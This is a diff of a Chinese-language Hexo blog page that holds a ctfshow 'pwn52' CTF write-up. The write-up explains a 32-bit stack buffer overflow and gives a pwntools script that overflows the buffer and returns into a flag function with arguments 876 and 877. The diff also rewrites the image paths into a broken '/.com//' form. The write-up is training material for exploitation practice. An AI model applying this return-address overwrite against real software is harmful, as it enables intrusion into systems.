@@ -23,15 +23,15 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="ctfshow pwn52  我们先checksec一下：  那么可能就是栈溢出漏洞，拖入IDA中看看：  程序我已经动态调试，这里IDA给的s变量的大小是没错的，就是0x6c，我们看看有无其他的函数：  flag函数可以打印flag，但是有条件，a1&#x3D;&#x3D;876且a2&#x3D;&#x3D;877，a1与a2是我们调用函数时传入的参数，对于32位程序，参数就放在栈上，那就简单了">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/ctfshow-pwn52/1.png">
-<meta property="og:image" content="http://example.com/ctfshow-pwn52/2.png">
-<meta property="og:image" content="http://example.com/ctfshow-pwn52/3.png">
+<meta property="og:image" content="http://example.com/.com//1.png">
+<meta property="og:image" content="http://example.com/.com//2.png">
+<meta property="og:image" content="http://example.com/.com//3.png">
 <meta property="article:published_time" content="2024-05-29T02:47:14.000Z">
 <meta property="article:modified_time" content="2024-05-29T03:03:38.720Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="栈溢出">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/ctfshow-pwn52/1.png">
+<meta name="twitter:image" content="http://example.com/.com//1.png">
   
   
   
@@ -280,11 +280,11 @@
                 <h1 align="center">ctfshow pwn52</h1>
 
 <p>我们先checksec一下：</p>
-<p><img src="/ctfshow-pwn52/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/.com//1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <p>那么可能就是栈溢出漏洞，拖入IDA中看看：</p>
-<p><img src="/ctfshow-pwn52/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p><img src="/.com//2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
 <p>程序我已经动态调试，这里IDA给的s变量的大小是没错的，就是0x6c，我们看看有无其他的函数：</p>
-<p><img src="/ctfshow-pwn52/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p><img src="/.com//3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
 <p>flag函数可以打印flag，但是有条件，a1&#x3D;&#x3D;876且a2&#x3D;&#x3D;877，a1与a2是我们调用函数时传入的参数，对于32位程序，参数就放在栈上，那就简单了，我们在溢出的时候，把参数一并写在栈上，payload如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="hljs-number">28266</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>flag_address = elf.symbols[<span class="hljs-string">&quot;flag&quot;</span>]<br><br>sh.recvuntil(<span class="hljs-string">&quot;What do you want?\n&quot;</span>)<br>payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x6c</span>+<span class="hljs-number">0x4</span>) + p32(flag_address) + <span class="hljs-string">b&quot;AAAA&quot;</span> + p32(<span class="hljs-number">876</span>) + p32(<span class="hljs-number">877</span>)<br><br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
 
